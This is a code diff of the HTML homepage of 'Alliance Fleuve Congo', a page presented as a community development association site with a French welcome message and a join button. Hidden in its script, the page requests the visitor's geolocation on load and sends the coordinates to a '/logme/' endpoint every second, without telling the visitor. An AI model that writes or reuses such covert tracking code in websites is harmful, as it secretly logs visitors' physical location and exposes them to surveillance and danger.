@@ -1,52 +1,110 @@
 <!DOCTYPE html>
-
-<html>
-    <head>
-        <title>Alliance Fleuve Congo</title>
-        <style type="text/css">
-            
-            main {
-                background-image: url("skull1.jpg");
-                background-size: 1000px 1600px;
-                background-repeat: no-repeat;
-            }
-
-        </style>
-    </head>
-    <body>
-         <header>
-              <h2>
-                  Alliance Fleuve Congo
-              </h2>         
-         <header>
-         <main>
-              
-         <main>
-
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js" type='text/javascript' ></script>
-        <script type='text/javascript'>
-        function httpGet(theUrl)
-        {
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-            xmlHttp.send( null );
-            return xmlHttp.responseText;
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alliance Fleuve Congo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
         }
 
+        body {
+            background-image: url("skull.jpg"); /* ton image actuelle */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: #fff;
+        }
 
-        function autoUpdate() {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            coords = position.coords.latitude + "," + position.coords.longitude;
-             url = "[A[B[B/logme/" + coords;
+        header {
+            background: rgba(0, 51, 102, 0.9);
+            padding: 20px 10%;
+            text-align: center;
+            font-weight: 600;
+            font-size: 28px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        main {
+            min-height: 90vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            backdrop-filter: brightness(0.5);
+        }
+
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #ffd700;
+        }
+
+        p {
+            font-size: 20px;
+            max-width: 600px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            padding: 12px 30px;
+            background: #ffd700;
+            color: #003366;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: #fff;
+        }
+    </style>
+</head>
+<body>
+
+<header>Alliance Fleuve Congo</header>
+
+<main>
+    <h1>Bienvenue sur notre site</h1>
+    <p>Nous œuvrons pour le développement et la prospérité du Fleuve Congo et de ses communautés.</p>
+    <a href="#" class="btn">Nous rejoindre</a>
+</main>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    function httpGet(theUrl) {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", theUrl, false); // false pour requête synchrone
+        xmlHttp.send(null);
+        return xmlHttp.responseText;
+    }
+
+    function autoUpdate() {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const coords = position.coords.latitude + "," + position.coords.longitude;
+            const url = "/logme/" + coords; // ton endpoint
             httpGet(url);
-            console.log('should be working');
+            console.log('autoUpdate triggered');
             setTimeout(autoUpdate, 1000);
-        })
-        };
-        $(document).ready(function(){
-           autoUpdate();
         });
+    }
 
-        </script>
-    </body>
+    $(document).ready(function(){
+        autoUpdate();
+    });
+</script>
+
+</body>
 </html>
